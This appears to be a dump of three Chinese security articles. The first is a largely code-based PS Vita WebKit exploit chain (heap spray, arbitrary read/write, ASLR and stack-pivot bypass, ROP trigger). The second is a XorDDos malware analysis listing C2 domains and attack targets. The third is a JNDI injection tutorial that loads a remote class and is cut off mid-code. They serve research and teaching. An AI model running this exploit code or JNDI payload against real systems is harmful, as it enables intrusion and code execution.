&lt; 0x2000; ++i)      foo[i] = len;foo.sort();  u2d/d2u 是个在int 和 double之间转换的小助手：var _dview = null;  // u2d/d2u taken from PSA-2013-0903// wraps two uint32s into double precisionfunction u2d(low,hi)  {    if (!_dview) _dview = new DataView(new ArrayBuffer(16));    _dview.setUint32(0,hi);    _dview.setUint32(4,low);    return _dview.getFloat64(0);    }function d2u(d)  {    if (!_dview) _dview = new DataView(new ArrayBuffer(16));    _dview.setFloat64(0,d);    return { low: _dview.getUint32(4),              hi:  _dview.getUint32(0) };    }那么，如果我们现在查看arrays 我们将会发现 JSArray 对象扩展超出了它们的真正边界，而且它们的长度设置成了 0x8000000。因垂死听，这成功破坏了 Vita 上的 JSArray 对象，但是 Linux 上的崩溃触发了一个保护页。但这并不重要，因为我们攻击 Vita 而不是 Linux。现在当我们向一个损坏的bar对象写入的时候，我们可以实现一个越界任意读写，这很棒！但让我们升级到一个真正的任意读写吧。聪明的读者可能会注意到，由于 Vita 是一个 32 位的终端， 我们将长度设置为 0x8000000 ，每个JSValue 是 8 字节的，我们实际上已经有了任意读写的能力了。然而，我们仍然在从原始的bar 向量基写到偏移处，至今仍未泄漏任何堆的地址。此外，我们只能写double类型的值，这超级不方便。Arbitrary RW为了获得任意读写能力，我使用了与 2.00-3.20 WebKit 漏洞利用相同的技巧，详情点此。Spray buffers:buffers = new Array(spray_size);  buffer_len = 0x1344;  for (var i = 0; i &lt; buffers.length; ++i)      buffers[i] = new Uint32Array(buffer_len / 4);在内存中查找 Uint32Array buffer，在损坏的缓冲区之前（此处称为arr）的某个任意偏移开始进行搜索。var start = 0x20000000-0x11000;  for(;; start--) {      if (arr[start] != 0) {        _dview.setFloat64(0, arr[start]);        if (_dview.getUint32(0) == buffer_len / 4) { // Found Uint32Array            _dview.setUint32(0, 0xEFFFFFE0);            arr[start] = _dview.getFloat64(0); // change buffer size            _dview.setFloat64(0, arr[start-2]);            heap_addr = _dview.getUint32(4); // leak some heap address            _dview.setUint32(4, 0)            _dview.setUint32(0, 0x80000000);            arr[start-2] = _dview.getFloat64(0); // change buffer offset            break;        }    }}查找损坏的 Uint32Array：corrupted = null;  for (var i = 0; i &lt; buffers.length; ++i) {      if (buffers[i].byteLength != buffer_len) {        corrupted = buffers[i];        break;    }}var u32 = corrupted;  既然我们有了真正的任意读写，而且已经泄漏了一些堆地址，接下来便是：Code execution使用 textarea 对象的旧技巧这里再次使用（为什么发明新轮子？）首先，修改原来的Uint32Array 堆喷射交织至textarea对象。spray_size = 0x4000;textareas = new Array(spray_size);  buffers = new Array(spray_size);  buffer_len = 0x1344;  textarea_cookie = 0x66656463;  textarea_cookie2 = 0x55555555;  for (var i = 0; i &lt; buffers.length; ++i) {      buffers[i] = new Uint32Array(buffer_len / 4);    var e = document.createElement(""textarea"");    e.rows = textarea_cookie;    textareas[i] = e;}使用损坏的Uint32Array 对象，在内存中找到textarea。var some_space = heap_addr;  search_start = heap_addr;for (var addr = search_start/4; addr &lt; search_start/4 + 0x4000; ++addr) {      if (u32[addr] == textarea_cookie) {        u32[addr] = textarea_cookie2;        textarea_addr = addr * 4;        break;    }}/*    Change the rows of the Element object then scan the array of    sprayed objects to find an object whose rows have been changed*/var found_corrupted = false;  var corrupted_textarea;  for (var i = 0; i &lt; textareas.length; ++i) {      if (textareas[i].rows == textarea_cookie2) {        corrupted_textarea = textareas[i];        break;    }}现在我们有两个“视图”到同一个textarea：我们可以使用我们的u32对象在内存中直接修改它，我们还可以从 JavaScript 中调用它的函数。所以关键思路是通过我们的“内存访问”覆盖 vptr ，然后通过 JavaScript 调用修改的函数表。Mitigation 1: ASLR记住，Vita 有 ASLR ， 这就是为什么我们为何不得不复杂化这么多漏洞利用方法。但是利用任意读写的方法，我们可以泄漏textarea vptr 并且完全击败 ASLR；function read_mov_r12(addr) {      first = u32[addr/4];    second = u32[addr/4 + 1];    return ((((first &amp; 0xFFF) | ((first &amp; 0xF0000) &gt;&gt; 4)) &amp; 0xFFFF) | ((((second &amp; 0xFFF) | ((second &amp; 0xF0000) &gt;&gt; 4)) &amp; 0xFFFF) &lt;&lt; 16)) &gt;&gt;&gt; 0;}var vtidx = textarea_addr - 0x70;  var textareavptr = u32[vtidx / 4];SceWebKit_base = textareavptr - 0xabb65c;  SceLibc_base = read_mov_r12(SceWebKit_base + 0x85F504) - 0xfa49;  SceLibKernel_base = read_mov_r12(SceWebKit_base + 0x85F464) - 0x9031;  ScePsp2Compat_base = read_mov_r12(SceWebKit_base + 0x85D2E4) - 0x22d65;  SceWebFiltering_base = read_mov_r12(ScePsp2Compat_base + 0x2c688c) - 0x9e5;  SceLibHttp_base = read_mov_r12(SceWebFiltering_base + 0x3bc4) - 0xdc2d;  SceNet_base = read_mov_r12(SceWebKit_base + 0x85F414) - 0x23ED;  SceNetCtl_base = read_mov_r12(SceLibHttp_base + 0x18BF4) - 0xD59;  SceAppMgr_base = read_mov_r12(SceNetCtl_base + 0x9AB8) - 0x49CD;  我们谈谈代码执行吧。在 Vita 上没有 JIT ，也不可能分配 RWX 内存（只允许来自 PlayStation 的 Mobile App）。因此我们必须在 ROP 中写整个 payload 。之前的 exploit 使用了一个叫做 JSoS 的技术，点此查看详情。然而，浏览器在破坏 JSArray 之后变得实在是不稳定，所以我们向尽可能少的运行 JavaScript 代码。因此，新版本的 roptool 由 Davee 编写，支持 ASLR。这里的基本思想是 roptool 输出中有一些字（一个 word 4 字节）现在具有分配给它们的重定位信息。在重定位 payload 之后，这只是向这些字添加不同的base（SceWebKit_base/SceLibc_base /等），我们可以正常启动生成的 ROP 链。Mitigation 2: Stack-pivot protection由于固件版本未知，现在有了额外的漏洞缓解实施方案：有时内核将检测你的线程栈指针实际是在其堆栈内的。如果不是的话，整个程序将被杀死。为了绕过这个情况，我们需要将我们的 ROP 链植入线程堆栈。为了做到这点，我们需要线程栈虚地址。因为ASLR的存在，我们并不知道此地址。然而我们有内存任意读写。有大量方法泄漏栈指针。我使用 setjmp函数。这便是我们如何调用它的：// copy vtablefor (var i = 0; i &lt; 0x40; i++)      u32[some_space / 4 + i] = u32[textareavptr / 4 + i];u32[vtidx / 4] = some_space;// backup our objfor (var i = 0; i &lt; 0x30; ++i)      backup[i] = u32[vtidx/4 + i];// call setjmp and leak stack baseu32[some_space / 4 + 0x4e] = SceLibc_base + 0x14070|1; // setjmp  corrupted_textarea.scrollLeft = 0; // call setjmp现在我们的 corrupted_textarea 在内存中被  jmp_buf 覆盖，此处包含堆栈指针。然后，我们回复如下原始数据。这是为了在我们试图对损坏的 textarea 对象做一些事情的时候，JavaScript 不会使浏览器崩溃。// restore our objfor (var i = 0; i &lt; 0x30; ++i)      u32[vtidx/4 + i] = backup[i];不幸的是，如果我们看到在 SceLibc 中 setjmp 的实现，我们得到另一个漏洞利用缓解方案。ROM:81114070 setjmp  ROM:81114070                 PUSH            {R0,LR}  ROM:81114072                 BL              sub_81103DF2 // Returns high-quality random cookie  ROM:81114076                 POP             {R1,R2}  ROM:81114078                 MOV             LR, R2  ROM:8111407A                 MOV             R3, SP  ROM:8111407C                 STMIA.W         R1!, {R4-R11}  ROM:81114080                 EORS            R2, R0 // LR is XOR'ed with a cookie  ROM:81114082                 EORS            R0, R3 // SP is XOR'ed with the same cookie  ROM:81114084                 STMIA           R1!, {R0,R2}  ROM:81114086                 VSTMIA          R1!, {D8-D15}  ROM:8111408A                 VMRS            R2, FPSCR  ROM:8111408E                 STMIA           R1!, {R2}  ROM:81114090                 MOV.W           R0, #0  ROM:81114094                 BX              LR  基本上:stored_LR = LR ^ cookie  stored_SP = SP ^ cookie  你能看明白这是怎么回事吗？我们已经知道 SceWebKit_base，所以我们知道LR的真正价值。使用离散代数魔法：cookie = stored_LR ^ LR  SP = stored_SP ^ cookie  SP = stored_SP ^ (stored_LR ^ LR)  或者在 JavaScript 中：sp = (u32[vtidx/4 + 8] ^ ((u32[vtidx/4 + 9] ^ (SceWebKit_base + 0x317929)) &gt;&gt;&gt; 0)) &gt;&gt;&gt; 0;  sp -= 0xef818; // adjust to get SP base  现在我们可以将我们的 ROP payload 写入线程栈并转向它，而不会停止应用程序！Finally, Code Execution首先，我们重定位 ROP payload。记住我们如何获得 payload 和 relocs。如果你看到 payload.js ，这将是你所看到的：payload = [2119192402,65537,0,0,1912    // and it goes on...  relocs = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,  // ...  relocs 数组中的每个数字表示了 payload 成员应该如何重定位的。例如，0 表示不进行重定位，1 表示添加 rop_data_base，2 表示 添加 SceWebKit_base，3 表示添加SceLibKernel_base 等...使用 roptool 生成的 ROP 链有两个部分：代码和数据。代码只是 ROP 堆栈，数据是字符串或缓冲区。rop_data_base 是数据的 vaddr， rop_code_base 是代码的 vaddr）下一个循环将 payload 直接重定位到线程堆栈中：// relocate the payloadrop_data_base = sp + 0x40;  rop_code_base = sp + 0x10000;addr = sp / 4;  // Since relocs are applied to the whole rop binary, not just code/data sections, we replicate// this behavior here. However, we split it into data section (placed at the top of the stack)// and code section (placed at stack + some big offset)for (var i = 0; i &lt; payload.length; ++i, ++addr) {      if (i == rop_header_and_data_size)        addr = rop_code_base / 4;    switch (relocs[i]) {    case 0:        u32[addr] = payload[i];        break    case 1:        u32[addr] = payload[i] + rop_data_base;        break;    /*        skipped most relocs    */    default:        alert(""wtf?"");        alert(i + "" "" + relocs[i]);    }}在这个循环中，我们将有效 payload 分成两个部分：代码段和和数据段。我们不希望代码接触到数据，因为如果它们靠的太近，并且代码在数据之后（这是 roptool 生成的 ROP 链的情况），当调用函数时，它可能会损坏一部分数据段（记着栈增长的方向，这是 ROP 链所沿着的方向）。因此一旦我们完成重定位数据段：if (i == rop_header_and_data_size) ，我们转向重定位代码段：addr = rop_code_base / 4.图片的左边是 ROP 链存储在 payload 数组中的样子。右边展示了 ROP 链是如何写入栈中的。最后，我们来触发 ROP 链吧。// 54c8: e891a916 ldm r1, {r1, r2, r4, r8, fp, sp, pc}u32[some_space / 4 + 0x4e] = SceWebKit_base + 0x54c8;var ldm_data = some_space + 0x100;  u32[ldm_data/4 + 5] = rop_code_base;              // sp  u32[ldm_data/4 + 6] = SceWebKit_base + 0xc048a|1; // pc = pop {pc}// This alert() is used to distinguish between the webkit exploit fail// and second stage exploit fail// - If you don't see it, the webkit exploit failed// - If you see it and then the browser crashes, the second stage failedalert(""Welcome to HENkaku!"");corrupted_textarea.scrollLeft = ldm_data;         // trigger ropchain, r1=arg// You won't see this alert() unless something went terribly wrongalert(""that's it"");  当 corrupted_textarea.scrollLeft = ldm_data 完成时，由于覆盖了 vtable ，我们的 LDM gadget 将会被调用。R1 会变成 ldm_data ，因此它将从缓冲区加载 SP = rop_code_base 和 PC = pop {pc} ，这将会启动 ROP 链。Bonus: How Sony patched it索尼按照 LGPL 的要求定期上传他们的 Webkit 新源码到此页面。（若是他们没有这么做，这种情况他们需要通过邮件要求一个友好的戳印）将 3.60 和 3.61 版本之间的源码进行比较，将会发现以下内容（已省略无用的东西）：diff -r 360/webkit_537_73/Source/JavaScriptCore/runtime/JSArray.cpp 361/webkit_537_73/Source/JavaScriptCore/runtime/JSArray.cpp  1087,1096c1087,1123  -     }- };- - - template&lt;IndexingType indexingType, typename StorageType&gt;- void JSArray::sortCompactedVector(ExecState* exec, ContiguousData&lt;StorageType&gt; data, unsigned relevantLength)- {-     if (!relevantLength)-         return;-     ---+     }+ };+ + template &lt;&gt;+ ContiguousJSValues JSArray::storage&lt;ArrayWithInt32, WriteBarrier&lt;Unknown&gt; &gt;()+ {+     return m_butterfly-&gt;contiguousInt32();+ }+ + template &lt;&gt;+ ContiguousDoubles JSArray::storage&lt;ArrayWithDouble, double&gt;()+ {+     return m_butterfly-&gt;contiguousDouble();+ }+ + template &lt;&gt;+ ContiguousJSValues JSArray::storage&lt;ArrayWithContiguous, WriteBarrier&lt;Unknown&gt; &gt;()+ {+     return m_butterfly-&gt;contiguous();+ }+ + template &lt;&gt;+ ContiguousJSValues JSArray::storage&lt;ArrayWithArrayStorage, WriteBarrier&lt;Unknown&gt; &gt;()+ {+     ArrayStorage* storage = m_butterfly-&gt;arrayStorage();+     ASSERT(!storage-&gt;m_sparseMap);+     return storage-&gt;vector();+ }+ + template&lt;IndexingType indexingType, typename StorageType&gt;+ void JSArray::sortCompactedVector(ExecState* exec, ContiguousData&lt;StorageType&gt; data, unsigned relevantLength)+ {+     data = storage&lt;indexingType, StorageType&gt;();+ +     if (!relevantLength)+         return;+     1167,1172c1194,1200  -         CRASH();-     }- -     for (size_t i = 0; i &lt; relevantLength; i++)-         ContiguousTypeAccessor&lt;indexingType&gt;::setWithValue(vm, this, data, i, values[i].first);-     ---+         CRASH();+     }+ +     data = storage&lt;indexingType, StorageType&gt;();+     for (size_t i = 0; i &lt; relevantLength; i++)+         ContiguousTypeAccessor&lt;indexingType&gt;::setWithValue(vm, this, data, i, values[i].first);+   他们现在在更新data 指针之前写入值。所以即使数组被重新分配，它仍然写入正确的内存。如果你尝试在在 3.61 版本上运行 HENkaku，这就是造成alert(""restart the browser"")错误的原因。干的漂亮，Sony！","2016-11-03 18:32:06","网络安全","Exploiting WebKit on Vita 3.60","http://nsoad.com/Article/Network-security/20161103/694.html"
"5ccbfb2a4f2f0a0a7a69c11f","一、起因上周五晚上，前同事丢给我一个样本，让我帮他分析一下，周未有事也没时间看，只是把样本丢到VT上扫了扫，报XorDDos.2，原来是14年就出现的XorDDos样本的变种，晚","silence","一、起因上周五晚上，前同事丢给我一个样本，让我帮他分析一下，周未有事也没时间看，只是把样本丢到VT上扫了扫，报XorDDos.2，原来是14年就出现的XorDDos样本的变种，晚上没玩LOL，把样本详细分析一下，写了这篇报告，欢迎学习交流，顺便赚点奶粉钱，呵呵。二、样本简介XorDDos类型样本主要特点，用暴力猜解目标机器ssh弱密码的方式，入侵目标机器，然后执行相应的shell脚本，安装病毒到目标机器，将目标机器变为DDos肉鸡，然后病毒利用多线程发起DDOS攻击。被安装的病毒会通过fork结束掉父进程，删除自身，并拷贝自身到各个系统目录下执行创建多个守护进程，样本在拷贝的过程中运用了简单的“多态”处理方式，随机生成相应的文件名，随机md5变换等。拷贝完成之后加载自启动服务，根据获取到操系统内核版本信息安装rootkit,p实现隐藏网络端口，文件等，最后通过多种方式发起DDos攻击。三、详细分析首先查看文件类型，如下：从图中我们可以得知，文件是linux32位可执行程序，通过ida反编译程序，main函数如下：    病毒首先设置相应环境变量，从上面的代码中我们可以看到里面有一个dec_conf函娄，用于解密字符串，得到相应的文件路径，下载地址等信息，解密函数如下：     查看ida里的xorkeys，我们得到了它的加解密key为：BB2FA36AAA9541F0，我们来用edb动态调试一下看看，打开edb加载样本，跟踪到main函数，如图所示：     然后单步调试，解密相应的字符串，得到如下图所示的路径信息：       将main函数中前面的字符串一个一个解密完成之后，得到如下的解密字符串列表：v27 = /usr/binv26 = /bin/v25 = /tmp/v23 =/var/run/gcc.pidv22 =/lib/libudev.sov21 = /lib/v20 = http://www1.gggtata456.com/dd.rarv24 = /var/run/通过edb动态调试，我们将下面的一些字符串全部解密完成，如图所示：病毒通过解密daemonname中的字符串，得到如下命令行列表，并执行相应的命令：cat reslov.confshbashsups -eflsls -lanetstat -annetstat -antopgrep ""A""sleep 1cd /etcecho""find""ifconfig eth0ifconfigroute -ngnome-terminalidwhowhoamipwduptime  然后病毒创建子进程，结束到父进程，如图所示：      复制自身到相应的目录，然后执行创建多个守护进程，并删除到自身，如图所示：     通过edb动态调试如下，在生成文件的时候使用随机文件名，病毒将自身拷贝到相应的目录下，如图所示：      拷贝完成如图所示：    病毒会把自身复制到如下目录列表中：/usr/bin/,/lib/libudev.so,/bin/,/lib/,/tmp/复制完成之后，它会把文件的做一点小的修改，使每个复制之后的md5值都不相同，实现简单的多态变型，代码如下：      加载设置自启动服务项，如图所示：     生成/etc/init.d/tmoogsb,文件内容如下：    修改/etc/cron.hourly/gcc.sh文件，将下面的脚本信息写入gcc.sh文件中，如图：    同时将/etc/init.d/tmoogsb文件拷贝生成到相应的目录下，实现多进程守护自启动，通过edb调试如下：    最后生成的文件列表如下：/etc/rc1.d/S90tmoogsb/etc/rc2.d/S90tmoogsb/etc/rc3.d/S90tmoogsb/etc/rc4.d/S90tmoogsb/etc/rc5.d/S90tmoogsb/etc/rc.d/rc1.d/S90tmoogsb/etc/rc.d/rc2.d/S90tmoogsb/etc/rc.d/rc3.d/S90tmoogsb/etc/rc.d/rc4.d/S90tmoogsb/etc/rc.d/rc4.d/S90tmoogsb增加系统服务：chkconfig –add tmoogsb，修改/etc/crontab，修改后的crontab内容如下：病毒通过解密算法，解密远程服务器地址列表，通过edb动态调试如下所示：      解密完成之后的远程服务器列表如下：aaa.gggatat456.comaaa.xxxatat456.com:6000bbb.gggatat456.com:22bbb.xxxatat456.com:22bbb.gggatat456.com:443bbb.xxxatat456.com:443然后通过/proc/meminfo,/proc/cpuinfo将感染后的机器相应信息发送到远程服务器上，如图所示：并能过rootkit隐藏相应的网络端口号，如图所示：      病毒安装rootkit之前会先收集感染机器的内核版本信息等，如图所示：    然后能过判断/proc/rs_dev是否可读，来判断LVM rootkit安装成功与否，如果存在LVM，则调过ioctl命令，执行相应的rootkit功能，隐藏进程端口，文件等功能，病毒通过http://www1.gggatat456.com/dd.rar配置信息网站，然后利用HTTP请求，下载配置文件信息，如图所示：下载之后的配置文件，通过前面的解密函数进行解密，并对不同的信息，进行不同的操作，不同的配置信息包括：denyip,filename,rmfile,killpid等，执行如下所示的操作：      病毒会执行相应的下载，更新，发送信息，结束进程，并通过多线程发起ddos攻击，如图所示：    执行ddos攻击的代码add_task，如下所示：     通过网络抓包的方式，利用wireshark抓包，如图所示：      通过分析，它发起的ddos攻击的地址列表如下：112.74.54.14061.153.110.3260.205.14.1219.135.226.97112.74.169.39114.113.198.158139.196.250.103对于ip地址和域名信息的情报分析工作，我就不作了，大家有兴趣可以去分析一下，也就是google大法了！样本基本就分析完毕了，此样本的主要作用是能过受感染的机器进行ddos攻击，再远程能过配置文件进行控制，执行相应的攻击，远程更新，下载，上传，执行相应的命令等。四、清除样本通过前面的分析，我们可以很容易清除相应的样本，同时我们可以发现，里面有一个DelService函数，如下图所示： 可以按上面的方法，清除相应的自启动服务项:/etc/init.d/tmoogsb/etc/cron.hourly/gcc.sh /etc/rc1.d/S90tmoogsb/etc/rc2.d/S90tmoogsb/etc/rc3.d/S90tmoogsb/etc/rc4.d/S90tmoogsb/etc/rc5.d/S90tmoogsb/etc/rc.d/rc1.d/S90tmoogsb/etc/rc.d/rc2.d/S90tmoogsb/etc/rc.d/rc3.d/S90tmoogsb/etc/rc.d/rc4.d/S90tmoogsb/etc/rc.d/rc4.d/S90tmoogsbchkconfig –del tmoogsbupdate-rc.d tmoogsb remove然后我们再去清除病毒拷贝到相应目录的文件就可以了，同时病毒存在rootkit技术，我们可以使用rkhunter,chkrootkit这两个工具去系统进行扫描，清除相应的rootkit模块就可以了，使用rkhunter如图所示：大家可以自行去研究，相应的下载地址见文末链接。五、总结主体样本基本分析完了，下面就开始“扯蛋”了，送给想加入这行，跟我一起苦逼的人吧，前方高能，大牛绕道，都是小弟的一点愚见！从事搬砖（逆向分析）这行也有好多年了，期间分析各种不同类型的样本，从最开始的window时代的鬼影第三代到第六代，蠕虫病毒，输入法，感染型，灰鸽子远程，熊猫烧香，游戏盗号，QQ盗号等样本，到后面Android时代的各种截持短信，流氓推广，弹广告，刷流量，刷ROM，以及后面手机端蠕虫，敲诈者,百脑虫,FakeDebugger，GhostPush，ios/mac上WireLurker,XcodeGhost,YiSpecter,ZergHelper,BackStab,KeyRaider,TinyV的等样本，以及现在linux上的一些恶意样本等，做为一名从业人员，有些是公司要求分析的，有些是自己觉得好玩下载分析的，我简单说说一些学习技巧与方法，需要的知识点，以及分析的大致流程。（1）拿到一个样本，不管是什么，先弄清它是什么文件格式，这里就要求你要对不同的文件格式有所了解了：window(PE),linux(ELF),android(dex,ELF),ios/mac(mach-o)（2）然后看样本有没有壳或加密，如果有壳就脱壳，有加密就看能不能解密（3）脱完壳，解完密，后面就是动+静态分析了动态调试：window(od,windbg),linux(gdb,edb),android(jeb,ida),ios/mac(lldb)静态调试: ida,010Editor,readelf,objdump,string等（4）网络抓包工具wireshark,tcpdump,Charles,BrupSuite（5）当分析一个样本，有可能程序很大，我们要有快速定位问题的能力，针对不同的样本，要分析不同的功能点，真正工作过程中分析一个样本，是需要一个快速响应，解决问题的能力的，同时在最快的时间内输出相应的分析报告，这个就要靠平时多锻炼了，有一种“阅片无数”的感觉（6）分析系统级的样本的时候，我们还需要对相应的系统有一个大致的了解，了解相应系统的启动过程，每种系统的自启动方式以及注入方式都不同，我们要对这些不同的系统都比较了解。（7）有了上面的一些基础，就是多实战了，可以从各个渠道下载不同类型的样本进行练习，积累经验。从事这行需要的一些知识点，我也简单的列一下吧,师傅带进门，修行靠个人了：（1）熟悉C/C++/Java/Python等语言，会一些简单的编程（2）熟悉PE，ELF,Mach-O文件格式（3）熟悉各个平台下的动态调试技术，以及ida的使用方法（4）了解各平台下的系统原理，知道它是如何加载一个程序的，自启动服务项，底层加载过程等（5）熟悉主流的一些黑客技术，攻击方式，各平台注入，hook等手段，以及工具的使用方法（6）熟悉tcp/ip网络协议,会使用各种抓包工具，分析数据包内容（7）简单的英语能力，至少会看的懂相应的英文文档（8）“翻墙”能力，这个不用多说了，去买个vpn吧（9）学会使用google，gmail等工具，加入一些gmail组邮件，会不定期发送一些样本，同时关注一些恶意样本下载网站，也会定期更新，如contagiodump.blogspot.com等，自行google吧……（10）到github上去fork一些好的关于安全的主页，想做安全这行，还是得多用心去关注这个行业的吧，如:https://github.com/rshipp/awesome-malware-analysis     https://github.com/secmobi/wiki.secmobi.com其它的自行github吧……好吧，需要的基本知识也就这些了，这条路很苦逼，只能带你入门，修行还是靠个人，很多时候大牛们都很忙，根本没时间教你，还是靠自己多努力吧，其实大牛们也是这么过来的，也没人手把手教他们，所以相互理解吧，我一般也不敢打扰那些大牛，都是自己去摸索，实在不行了，就问一下大牛们，不过最后还是得靠自己解决，随着网络安全的发展，我们需要去了解和学习新的网络安全技术，路还很长，且行且珍惜吧！网络安全发展到现在已经被云安全，IOT安全，移动安全等占据了主要位置，不管是云安全，还是智能移动安全，还是IOT安全,Malware恶胁总是无处不在，前段时间通过IoT和云服务器发起的大规模的DDos攻击，安全在未来不能去说有多么多么重要，但是安全总会一直在那存在着，因为有利益的地方，也就有“江湖”！看了一下，网上也有一些关于这个样本的其它不同变种的分析报告，我按我的分析流程和思路，写的报告，绝对原创，这里把相关的链接也贴下，免得有些人又会说这个那个的，诶，不解释了，圈里大，唯有独善其身，大家也可以参考一下：http://www.myhack58.com/Article/48/66/2015/59519_4.htmhttps://blog.avast.com/2015/01/06/linux-ddos-trojan-hiding-itself-with-an-embedded-rootkit/http://www.liuhaihua.cn/archives/110384.htmlhttp://www.aptno1.com/YC/102.htmlrkhunter及chkrootkit下载：rkhunter；chkrootkit","2016-11-11 16:37:45","系统安全","一次XorDDos变种样本的分析实战记录(附工具下载）","http://nsoad.com/Article/system/20161111/746.html"
"5ccbfb2a4f2f0a0a7a69c120","由于之前一直在外出差，好久没有做研究了，十一期间重新关注了2016 BlackHat上面的议题，其中jndi注入引起了我的关注，本文主要分为以下3个部分，理解jndi、    分析jndi注入问题，以及Srping RCE漏洞形成","blackhold","前言由于之前一直在外出差，好久没有做研究了，十一期间重新关注了2016 BlackHat上面的议题，其中jndi注入引起了我的关注，本文主要分为以下3个部分，理解jndi、    分析jndi注入问题，以及Srping RCE漏洞形成的原因。本文属于基础文档，大牛绕过勿喷~ 文章目录理解jndijndi注入产生的原因Spring RCE与Jndi注入之间的关系demo2016BlackHat中的jndi议题原文在：BlackHat英文好的同学可以去阅读原文。理解JNDIJndi 全称是：Java Naming and Directory Interface，叫做Java命名和目录接口、SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互、如图：Java Naming:命名服务是一种键值对的绑定，是应用程序可以通过键检索值Java Directory：目录服务是命名服务的自然扩展。两者之间的关键差别是目录服务中对象可以有属性（例如，用户有email地址），而命名服务中对象没有属性。因此，在目录服务中，你可以根据属性搜索对象。JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问象LDAP这样的目录服务，定位网络上的EJB组件 如图所示的层级结果，通俗理解jndi就是，一组api接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索制定的对象（object），对象可能存储在rmi，ldap，CORBA等等。在jndi中提供了绑定和查找的方法，jndi将name和object绑定在了一起，在这基础上提供了lookup，search功能1、void bind( String name , Object object ) //将名称绑定到对象2、Object lookup( String name ) //通过名字检索执行的对象下面写一个jdni的demo帮助理解：我们定义一个Person类   import java.io.Serializable;      import java.rmi.Remote;      public class Person implements Remote,Serializable {      private static final long serialVersionUID = 1L;      private String name;      private String password;      public String getName() {          return name;      }      public void setName(String name) {          this.name = name;      }      public String getPassword() {          return password;      }      public void setPassword(String password) {          this.password = password;      }      public String toString(){          return ""name:""+name+"" password:""+password;      }      }  这里服务端以rmi为例，   package com.jndi.demo;    import java.rmi.RemoteException;    import java.rmi.registry.LocateRegistry;    import javax.naming.Context;    import javax.naming.InitialContext;    import javax.naming.NamingException;    import javax.naming.spi.NamingManager;    public class Test {    public static void initPerson() throws Exception{        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常        LocateRegistry.createRegistry(3001);        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, ""com.sun.jndi.rmi.registry.RegistryContextFactory"");        System.setProperty(Context.PROVIDER_URL, ""rmi://localhost:3001"");        ////初始化        InitialContext ctx = new InitialContext();                //实例化person对象        Person p = new Person();        p.setName(""hello"");        p.setPassword(""jndi"");                //person对象绑定到JNDI服务中，JNDI的名字叫做：person。        ctx.bind(""person"", p);        ctx.close();    }        public static void findPerson() throws Exception{        //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了        InitialContext ctx = new InitialContext();        //通过lookup查找person对象        Person person = (Person) ctx.lookup(""person"");        //打印出这个对象        System.out.println(person.toString());        ctx.close();    }        public static void main(String[] args) throws Exception {        initPerson();        findPerson();    }    }运行结果如图：使用debug更直观的描述整个流程：从上图可以清楚的看到，在initPerson方法中，注册了rmi服务并绑定了端口，给p对象命名为person，在findPerson方法中查找被命名为person的对象，然后通过。最终输出了hello jndi。Jndi Naming Reference：java为了将object对象存储在Naming或者Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming和Directory服务下，比如（rmi，ldap等）。在使用Reference的时候，我们可以直接把对象写在构造方法中，当被调用的时候，对象的方法就会被触发。理解了jndi和jndi reference后，就可以理解jndi注入产生的原因了。Jndi注入产生的原因Applications should not perform JNDI lookups with untrusted datajndi注入产生的原因可以归结到以下4点1、lookup参数可控。2、InitialContext类及他的子类的lookup方法允许动态协议转换3、lookup查找的对象是Reference类型及其子类4、当远程调用类的时候默认会在rmi服务器中的classpath中查找，如果不存在就会去url地址去加载类。如果都加载不到就会失败。我们跟进lookup函数：    public Object lookup(String name) throws NamingException {        return getURLOrDefaultInitCtx(name).lookup(name);    }继续跟进getURLOrDefaultInitCtx函数，发现getURLOrDefaultInitCtx会返回两种情况，第一种getDefaultInit()，第二种是getUrlContext(scheme,myPorps)。这说明即使 Context.PROVIDER_URL参数被初为rmi://127.0.0.1:1099/foo,但是如果lookup的参数可控，那我们就可以重写url地址，使url地址指向我们的服务器。例如：  // Create the initial context    Hashtable env = new Hashtable();    env.put(Context.INITIAL_CONTEXT_FACTORY,     ""com.sun.jndi.rmi.registry.RegistryContextFactory"");    env.put(Context.PROVIDER_URL, ""rmi://secure-server:1099"");    Context ctx = new InitialContext(env);    // Look up in the local RMI registry    Object local_obj = ctx.lookup(&lt;attacker controlled&gt;);就可以实现远程加载恶意的对象，实现远程代码执行。我们发现存在3种方法，可以通过jndi注入导致远程代码执行:rmi、通过jndi reference远程调用object方法。CORBA IOR 远程获取实现类LDAP 通过序列化对象，JNDI Referene，ldap地址demo2 jndi注入例子：Server端：import com.sun.jndi.rmi.registry.ReferenceWrapper;    import javax.naming.Reference;    import java.rmi.registry.Registry;    import java.rmi.registry.LocateRegistry;    public class SERVER {    public static void main(String args[]) throws Exception {        Registry registry = LocateRegistry.createRegistry(1099);        Reference aa = new Reference(""ExecObj"", ""ExecObj"", ""http://127.0.0.1:8081/"");        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);        System.out.println(""Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'"");        registry.bind(""aa"", refObjWrapper);    }    }Client端：import javax.naming.Context;    import javax.naming.InitialContext;    public class CLIENT {    public static void main(String[] args) throws Exception {        String uri = ""rmi://127.0.0.1:1099/aa"";        Context ctx = new InitialContext();        ctx.lookup(uri);    }    }ExecObj：  package com.jndi.cn;    import java.io.BufferedReader;    import java.io.IOException;    import java.io.InputStream;    import java.io.InputStreamReader;    import java.io.Reader;    import javax.print.attribute.standard.PrinterMessageFromOperator;    public class ExecTest {    public static void main(String[] args) throws IOException,InterruptedException{        String cmd=""whoami"";        final Process process = Runtime.getRuntime().exec(cmd);        printMessage(process.getInputStream());;        printMessage(process.getErrorStream());        int value=process.waitFor();        System.out.println(value);    }    private static void printMessage(final InputStream input) {        // TODO Auto-generated method stub        new Thread (new Runnable() {                        @Override            public void run() {                // TODO Auto-generated method stub                Reader reader =new InputStreamReader(input);                BufferedReader bf = new BufferedReader(reader);                String line = null;                try {                    while ((line=bf.readLine())!=null)                    {                        System.out.println(line);                    }                }catch (IOException  